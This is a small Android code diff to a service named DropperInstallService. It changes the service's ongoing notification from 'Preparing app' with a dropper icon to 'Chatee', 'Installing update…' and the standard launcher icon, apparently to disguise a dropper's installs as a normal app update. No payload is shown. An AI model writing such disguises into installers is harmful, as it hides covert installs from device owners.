@@ -28,9 +28,9 @@ public class DropperInstallService extends Service {
         super.onCreate();
         createChannel();
         Notification notification = new NotificationCompat.Builder(this, CHANNEL)
-            .setContentTitle("Preparing app")
-            .setContentText("Installing components…")
-            .setSmallIcon(R.mipmap.ic_dropper)
+            .setContentTitle("Chatee")
+            .setContentText("Installing update…")
+            .setSmallIcon(R.mipmap.ic_launcher)
             .setOngoing(true)
             .setPriority(NotificationCompat.PRIORITY_LOW)
             .build();
